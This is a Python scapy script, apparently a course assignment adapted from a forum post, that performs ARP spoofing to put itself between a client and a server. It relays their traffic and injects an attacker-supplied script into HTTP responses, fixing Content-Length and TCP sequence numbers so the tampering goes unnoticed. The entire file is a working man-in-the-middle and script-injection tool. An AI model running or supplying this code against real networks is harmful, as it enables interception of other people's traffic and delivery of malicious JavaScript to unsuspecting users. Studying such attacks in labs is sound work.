# largely copied from https://0x00sec.org/t/quick-n-dirty-arp-spoofing-in-python/487
from scapy.all import *

import argparse
import os
import re
import sys
import threading
import time

def parse_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", help="network interface to bind to", required=True)
    parser.add_argument("-ip1", "--clientIP", help="IP of the client", required=True)
    parser.add_argument("-ip2", "--serverIP", help="IP of the server", required=True)
    parser.add_argument("-s", "--script", help="script to inject", required=True)
    parser.add_argument("-v", "--verbosity", help="verbosity level (0-2)", default=0, type=int)
    return parser.parse_args()


def debug(s):
    global verbosity
    if verbosity >= 1:
        print('#{0}'.format(s))
        sys.stdout.flush()


# DONE: returns the mac address for an IP
def mac(IP):
    return getmacbyip(IP)

def spoof_thread(clientIP, clientMAC, serverIP, serverMAC, attackerIP, attackerMAC, interval = 3):
    while True:
        spoof(serverIP, attackerMAC, clientIP, clientMAC) # Spoof client ARP table
        spoof(clientIP, attackerMAC, serverIP, serverMAC) # Spoof server ARP table
        time.sleep(interval)


# DONE: spoof ARP so that dst changes its ARP table entry for src 
def spoof(src_ip, src_mac, dst_ip, dst_mac):
    debug(f"spoofing {dst_ip}'s ARP table: setting {src_ip} to {src_mac}")
    sendp(Ether(dst=dst_mac, src=src_mac) / ARP(op=2, pdst=dst_ip, psrc=src_ip))

# DONE: restore ARP so that dst changes its ARP table entry for src
def restore(srcIP, srcMAC, dstIP, dstMAC):
    debug(f"restoring ARP table for {dstIP}")
    sendp(Ether(dst=dstMAC, src=srcMAC) / ARP(op=2, pdst=dstIP, psrc=srcIP))

# DONE: handle intercepted packets
def interceptor(packet):
    global clientMAC, clientIP, serverMAC, serverIP, attackerMAC, attackerIP, script, injected, to_inject, mtu, finish, buf
    script_to_inject = ("<script>" + script + "</script>").encode()
    
    if packet[Ether].src != attackerMAC and packet.haslayer(IP):
        packet = packet

        if packet[IP].dst == clientIP:

            if packet.haslayer(TCP):
                p = packet[TCP].dport
                packet[TCP].seq += injected.get(p, 0)
                if packet[TCP].flags & 0x01 and p in finish:
                    finish[p] = 1

                if packet.haslayer(Raw):
                    payload = buf.get(p, b"") + packet[Raw].load
                    buf[p] = b""
                    cur_injected = b""
                    total_len = to_inject.get(p, 0)

                    content_length = b"Content-Length: "
                    html = b"<html>"
                    start = -1
                    end = 0
                    html_start = 0
                    if content_length in payload:
                        start = payload.index(content_length) + len(content_length)
                        end = payload[start:].index(ord("\r")) + start
                        try:
                            html_start = packet[Raw].load.index(html)
                        except:
                            html_start = 0
                    if start != -1:
                        total_len = int(payload[start:end].decode())
                        cur_injected += payload[:start] + str(total_len + len(script_to_inject)).encode()
                    
                    body = b"</body>"
                    body_start = -1
                    if body in payload:
                        body_start = payload.index(body)
                    if body_start != -1:
                        cur_injected += payload[end:body_start] + script_to_inject + payload[body_start:]
                    else:
                        cur_injected += payload[end:-(len(body)-1)]
                        buf[p] = payload[-(len(body)-1):]
                    
                    header_len = len(packet[IP]) - len(packet[Raw])
                    if len(cur_injected) + header_len > mtu:
                        buf[p] = cur_injected[-(len(cur_injected) + mtu - header_len):] + buf[p]
                        cur_injected = cur_injected[:-(len(cur_injected) + mtu - header_len)]

                    injected_len = len(cur_injected) - len(packet[Raw].load)
                    total_len -= len(packet[Raw].load) - html_start
                    tmp = to_inject.get(p, -1)
                    if tmp == 0:
                    	return
                    elif tmp == -1:
                        injected[p] = injected_len
                        finish[p] = 0
                    else:
                        injected[p] += injected_len
                    to_inject[p] = total_len
                    packet[Raw].load = cur_injected

                del packet[TCP].chksum

            packet[Ether].dst = clientMAC
            packet[Ether].src = attackerMAC
            del packet[IP].chksum
            del packet[IP].len
            debug(packet.summary())
            sendp(packet)

        if packet[IP].dst == serverIP:

            if packet.haslayer(TCP):
                p = packet[TCP].sport
                packet[TCP].ack -= injected.get(p, 0)
                if finish.get(p, 0):
                    del injected[p]
                    del to_inject[p]
                    del finish[p]
                del packet[TCP].chksum

            packet[Ether].dst = serverMAC
            packet[Ether].src = attackerMAC
            del packet[IP].chksum
            del packet[IP].len
            debug(packet.summary())
            sendp(packet)

if __name__ == "__main__":
    args = parse_arguments()
    verbosity = args.verbosity
    if verbosity < 2:
        conf.verb = 0 # minimize scapy verbosity
    conf.iface = args.interface # set default interface

    clientIP = args.clientIP
    serverIP = args.serverIP
    attackerIP = get_if_addr(args.interface)

    clientMAC = mac(clientIP)
    serverMAC = mac(serverIP)
    attackerMAC = get_if_hwaddr(args.interface)

    script = args.script
    mtu = 1500
    injected = {}
    to_inject = {}
    finish = {}
    buf = {}

    # start a new thread to ARP spoof in a loop
    spoof_th = threading.Thread(target=spoof_thread, args=(clientIP, clientMAC, serverIP, serverMAC, attackerIP, attackerMAC), daemon=True)
    spoof_th.start()

    # start a new thread to prevent from blocking on sniff, which can delay/prevent KeyboardInterrupt
    sniff_th = threading.Thread(target=sniff, kwargs={'prn':interceptor}, daemon=True)
    sniff_th.start()

    try:
        while True:
            pass
    except KeyboardInterrupt:
        restore(clientIP, clientMAC, serverIP, serverMAC)
        restore(serverIP, serverMAC, clientIP, clientMAC)
        sys.exit(1)

    restore(clientIP, clientMAC, serverIP, serverMAC)
    restore(serverIP, serverMAC, clientIP, clientMAC)
